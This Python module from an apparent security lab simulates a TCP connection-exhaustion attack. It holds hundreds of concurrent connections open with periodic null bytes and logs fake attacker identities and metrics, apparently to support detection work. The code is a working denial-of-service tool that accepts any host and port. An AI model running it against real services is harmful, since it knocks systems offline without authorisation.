"""TCP connection-exhaustion attack simulation module.

Opens many concurrent TCP connections to the lab's generic TCP service and
holds them open without sending meaningful data, aiming to exhaust the
target's connection table. Confined to the isolated attacker_net/target_net.
"""
import argparse
import asyncio
import os
import time

from common.identity import random_fake_identity
from common.metrics import ACTIVE_WORKERS, ERRORS, REQUESTS_SENT, serve_metrics
from common.recorder import Recorder, SimEvent

ATTACK_TYPE = "tcp_exhaustion"


async def hold_connection(host: str, port: int, recorder: Recorder, stop_at: float):
    identity = random_fake_identity()
    while time.time() < stop_at:
        try:
            reader, writer = await asyncio.open_connection(host, port)
            REQUESTS_SENT.labels(attack_type=ATTACK_TYPE, target=f"{host}:{port}").inc()
            recorder.record(
                SimEvent(
                    ts=time.time(),
                    attack_type=ATTACK_TYPE,
                    target=f"{host}:{port}",
                    fake_ip=identity.fake_ip,
                    city=identity.city,
                    lat=identity.lat,
                    lon=identity.lon,
                )
            )
            while time.time() < stop_at:
                writer.write(b"\x00")
                await writer.drain()
                await asyncio.sleep(10)
            writer.close()
        except Exception:
            ERRORS.labels(attack_type=ATTACK_TYPE, target=f"{host}:{port}").inc()
            await asyncio.sleep(1)


async def run(host: str, port: int, concurrency: int, duration: int, run_name: str):
    recorder = Recorder(run_name)
    stop_at = time.time() + duration
    ACTIVE_WORKERS.labels(attack_type=ATTACK_TYPE).set(concurrency)
    await asyncio.gather(*[hold_connection(host, port, recorder, stop_at) for _ in range(concurrency)])
    ACTIVE_WORKERS.labels(attack_type=ATTACK_TYPE).set(0)
    recorder.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SENTINEL LAB: TCP connection exhaustion simulation")
    parser.add_argument("--host", default=os.environ.get("TARGET_HOST", "tcp-service"))
    parser.add_argument("--port", type=int, default=int(os.environ.get("TARGET_PORT", "9000")))
    parser.add_argument("--concurrency", type=int, default=int(os.environ.get("CONCURRENCY", "200")))
    parser.add_argument("--duration", type=int, default=int(os.environ.get("DURATION", "60")))
    parser.add_argument("--run-name", default=os.environ.get("RUN_NAME", f"tcp_exhaustion_{int(time.time())}"))
    parser.add_argument("--metrics-port", type=int, default=int(os.environ.get("METRICS_PORT", "9403")))
    args = parser.parse_args()

    serve_metrics(args.metrics_port)
    asyncio.run(run(args.host, args.port, args.concurrency, args.duration, args.run_name))
